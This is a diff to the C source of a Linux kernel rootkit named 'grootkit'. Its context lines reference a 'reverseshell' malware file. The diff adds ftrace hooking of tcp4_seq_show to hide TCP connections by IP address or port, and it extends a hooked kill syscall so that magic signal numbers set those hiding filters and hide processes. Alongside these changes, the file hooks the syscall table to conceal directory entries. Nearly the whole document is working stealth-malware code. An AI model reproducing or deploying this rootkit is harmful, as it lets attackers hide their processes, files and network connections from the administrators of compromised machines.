@@ -1,13 +1,30 @@
+/*
+    Copyright (C) 2023  Maurice Lambert
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
+
 #include <linux/fs.h>
+#include <linux/tcp.h>
 #include <linux/list.h>
 #include <linux/init.h>
 #include <linux/slab.h>
 #include <linux/path.h>
 #include <linux/sched.h>
+#include <linux/ftrace.h>
 #include <linux/string.h>
 #include <linux/dirent.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/linkage.h>
 #include <asm/processor.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
@@ -17,6 +34,8 @@
 #include <linux/compiler.h>
 #include <linux/syscalls.h>
 #include <linux/moduleparam.h>
+
+#pragma GCC optimize("-fno-optimize-sibling-calls")
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
 #define KPROBE_LOOKUP 1
@@ -62,13 +81,28 @@ static char *malwarefile = "reverseshell";
 module_param(malwarefile, charp, 0000);
 MODULE_PARM_DESC(malwarefile, "The malware filename");
 
-static long int killcode = 14600;
-module_param(killcode, long, 0000);
-MODULE_PARM_DESC(killcode, "Kill signal to hide process from kill");
+static long int processsignal = 14600;
+module_param(processsignal, long, 0000);
+MODULE_PARM_DESC(processsignal, "Kill signal to hide process from kill");
 
+static long int ipsignal = 0xdead;
+module_param(ipsignal, long, 0000);
+MODULE_PARM_DESC(ipsignal, "Kill signal to hide any connection from/to a specific IP address using kill to define the IP address");
+
+static long int sourceportsignal = 666;
+module_param(sourceportsignal, long, 0000);
+MODULE_PARM_DESC(sourceportsignal, "Kill signal to hide tcp connection with specific source port from kill");
+
+static long int destinationportsignal = 0xbeef;
+module_param(destinationportsignal, long, 0000);
+MODULE_PARM_DESC(destinationportsignal, "Kill signal to hide tcp connection with specific destination port from kill");
+
+unsigned int ip_address = 0;
+unsigned short source_port = 0;
+unsigned short destination_port = 0;
 
 /*
-    Defined structures not in kernel headers.
+    Define structure not in kernel headers.
     https://elixir.bootlin.com/linux/v5.15.137/source/fs/readdir.c#L207
 */
 struct linux_dirent {
@@ -76,6 +110,19 @@ struct linux_dirent {
     unsigned long   d_off;
     unsigned short  d_reclen;
     char            d_name[1];
+};
+
+/*
+    Define structure to have necessary
+    informations in symbol hooking.
+*/
+struct ftrace_hook {
+    const char *name;
+    void *function;
+    void *original;
+
+    unsigned long address;
+    struct ftrace_ops ops;
 };
 
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
@@ -86,17 +133,20 @@ struct linux_dirent {
     Define the mkdir syscalls signatures.
 */
 #ifdef PTREGS_SYSCALL_STUBS
+typedef asmlinkage long (*tcp4_seq_show_signature)(const struct pt_regs *);
 typedef asmlinkage long (*getdents64_signature)(const struct pt_regs *);
 typedef asmlinkage int (*getdents_signature)(const struct pt_regs *);
 typedef asmlinkage long (*mkdir_signature)(const struct pt_regs *);
 typedef asmlinkage long (*kill_signature)(const struct pt_regs *);
 #else
-typedef asmlinkage long (*getdents64_signature)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
-typedef asmlinkage int (*getdents_signature)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
-typedef asmlinkage long (*mkdir_signature)(const char __user *pathname, umode_t mode);
-typedef asmlinkage long (*kill_signature)(pid_t pid, int sig);
+typedef asmlinkage long (*getdents64_signature)(unsigned int, struct linux_dirent64 *, unsigned int);
+typedef asmlinkage int (*getdents_signature)(unsigned int, struct linux_dirent *, unsigned int);
+typedef asmlinkage long (*mkdir_signature)(const char __user *, umode_t);
+typedef asmlinkage long (*tcp4_seq_show_signature)(struct seq_file *, void *);
+typedef asmlinkage long (*kill_signature)(pid_t, int);
 #endif
 
+tcp4_seq_show_signature tcp4_seq_show_base;
 getdents64_signature getdents64_base;
 getdents_signature getdents_base;
 mkdir_signature mkdir_base;
@@ -250,16 +300,21 @@ asmlinkage long kill_hook(const struct pt_regs *regs) {
 asmlinkage long kill_hook(pid_t pid, int signal) {
 #endif
     // printk(KERN_CRIT "kill with signal: %i\n", signal);
-    if (signal == killcode) {
+    if (signal == processsignal) {
         // printk(KERN_CRIT "kill hooking\n");
         set_hidden_flags(pid);
+    } else if (signal == sourceportsignal) {
+        source_port = htons((unsigned short)pid);
+    } else if (signal == destinationportsignal) {
+        destination_port = htons((unsigned short)pid);
+    } else if (signal == ipsignal) {
+        ip_address = htonl((unsigned int)pid);
     }
 #ifdef PTREGS_SYSCALL_STUBS
     return kill_base(regs);
 #else
     return kill_base(pid, signal);
 #endif
-    return 0;
 }
 
 /*
@@ -423,10 +478,49 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, un
 }
 
 /*
-    This function hooks syscalls.
+    This function hooks tcp4_seq_show_hook to hide
+    IPv4 TCP connection whith specific port or IP address.
 */
-void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
-#ifdef KPROBE_LOOKUP
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage long tcp4_seq_show_hook(const struct pt_regs *regs) {
+    void *s = (void *)regs->si;
+#else
+asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *s) {
+#endif
+    // printk(KERN_CRIT "sport: %i %i, dport: %i %i, ip: %i %i\n", sport, source_port, dport, destination_port, ip, ip_address);
+
+    struct inet_sock *socket = NULL;
+    if (s != SEQ_START_TOKEN) {
+        socket = (struct inet_sock *)s;
+        // printk(KERN_CRIT "Not SEQ_START_TOKEN %i=%i %i=%i %li=%li %li=%li\n", sport, socket->inet_sport, dport, socket->inet_dport, ip, socket->inet_saddr, ip, socket->inet_daddr);
+        if (
+            (source_port && source_port == socket->inet_sport) ||
+            (destination_port && destination_port == socket->inet_dport) ||
+            (ip_address && (ip_address == socket->inet_daddr || ip_address == socket->inet_saddr))
+        ) {
+            // printk(KERN_CRIT "connection hidden for specific TCP port or IP address\n");
+            return 0;
+        }
+    }
+
+    // printk(KERN_CRIT "Don't hide, tcp4_seq_show_base: %p %p\n", (void *)regs->si, (void *)regs->di);
+#ifdef PTREGS_SYSCALL_STUBS
+    long t = tcp4_seq_show_base(regs);
+#else
+    long t = tcp4_seq_show_base(seq, s);
+#endif
+    if (socket != NULL) {
+        // printk(KERN_CRIT "Not SEQ_START_TOKEN %i=%i %i=%i %li=%li %li=%li\n", source_port, socket->inet_sport, destination_port, socket->inet_dport, ip_address, socket->inet_saddr, ip_address, socket->inet_daddr);
+    }
+    return t;
+}
+
+/*
+    This function returns kernel symbol
+    (work with recent kernel versions).
+*/
+void *resolve_kernel_symbol(const char* symbol) {
+    #ifdef KPROBE_LOOKUP
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
     kallsyms_lookup_name_t kallsyms_lookup_name;
     // printk(KERN_INFO "Register kallsyms_lookup_name\n");
@@ -436,8 +530,20 @@ void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
     // printk(KERN_INFO "Unregister kallsyms_lookup_name\n");
     unregister_kprobe(&kp);
 #endif
+    // printk(KERN_INFO "Get symbol address\n");
+    return (void *)kallsyms_lookup_name(symbol);
+}
+
+/*
+    This function hooks syscalls.
+*/
+void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
     // printk(KERN_INFO "Get sys_call_table address\n");
-    unsigned long *syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    unsigned long *syscall_table = (unsigned long *)resolve_kernel_symbol("sys_call_table");
+    if (!syscall_table) {
+        printk(KERN_DEBUG "Error getting sys_call_table symbol\n");
+        return NULL;
+    }
 
     // printk(KERN_INFO "Get syscall address\n");
     void *base = (void *)syscall_table[syscall_number];
@@ -450,6 +556,67 @@ void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
     memprotect(1);
 
     return base;
+}
+
+/*
+    Define hook structure for tcp4_seq_show symbol.
+*/
+struct ftrace_hook tcp4_seq_show_struct = {"tcp4_seq_show", tcp4_seq_show_hook, &tcp4_seq_show_base, 0, {}};
+
+/*
+    This function changes RIP register to call hooked function.
+*/
+static void notrace function_hook(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs) {
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+
+    // printk(KERN_CRIT "RIP: '%li' '%li' %li\n", ip, regs->regs.ip, (unsigned long) hook->function);
+    if(!within_module(parent_ip, THIS_MODULE))
+        regs->regs.ip = (unsigned long) hook->function;
+    // printk(KERN_CRIT "RIP: '%li' '%li' %li\n", ip, regs->regs.ip, (unsigned long) hook->function);
+}
+
+/*
+    This function hooks a kernel symbol.
+*/
+void *symbol_hooking(struct ftrace_hook *hook) {
+    hook->address = (unsigned long)resolve_kernel_symbol(hook->name);
+    if (hook->address == 0) {
+        // printk(KERN_CRIT "Symbol '%s' not found\n", hook->name);
+        return (void *)hook->address;
+    }
+    // printk(KERN_INFO "Original %p %p\n", hook->original, tcp4_seq_show_base);
+    *((unsigned long*) hook->original) = hook->address;
+    // printk(KERN_INFO "Original %p %p\n", hook->original, tcp4_seq_show_base);
+
+    hook->ops.func = function_hook;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
+
+    int error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    if (error) {
+        printk(KERN_DEBUG "Error hooking '%s' symbol (ftrace_set_filter_ip)\n", hook->name);
+        return (void *)hook->address;
+    }
+
+    error = register_ftrace_function(&hook->ops);
+    if (error) {
+        printk(KERN_DEBUG "Error hooking '%s' symbol (register_ftrace_function)\n", hook->name);
+        return (void *)hook->address;
+    }
+
+    return (void *)hook->address;
+}
+
+/*
+    This function unhooks a kernel symbol.
+*/
+void symbol_unhooking(struct ftrace_hook *hook) {
+    if (unregister_ftrace_function(&hook->ops)) {
+        printk(KERN_DEBUG "Error unhooking '%s' symbol (unregister_ftrace_function)\n", hook->name);
+    }
+
+    if (ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0)) {
+        printk(KERN_DEBUG "Error unhooking '%s' symbol (ftrace_set_filter_ip)\n", hook->name);
+    }
 }
 
 /*
@@ -466,6 +633,9 @@ static int __init grootkit_init(void) {
     getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_getdents64);
     // printk(KERN_INFO "getdents syscall hooking\n");
     getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
+    // printk(KERN_INFO "tcp4_seq_show syscall hooking %p\n", tcp4_seq_show_base);
+    tcp4_seq_show_base = symbol_hooking(&tcp4_seq_show_struct);
+    // printk(KERN_INFO "tcp4_seq_show syscall hooking %p\n", tcp4_seq_show_base);
     // printk(KERN_INFO "return\n");
     return 0;
 }
@@ -478,6 +648,7 @@ static void __exit grootkit_exit(void) {
     syscall_hooking((unsigned long)kill_base, (unsigned int)__NR_kill);
     syscall_hooking((unsigned long)getdents64_base, (unsigned int)__NR_getdents64);
     syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
+    symbol_unhooking(&tcp4_seq_show_struct);
 }
 
 module_init(grootkit_init);
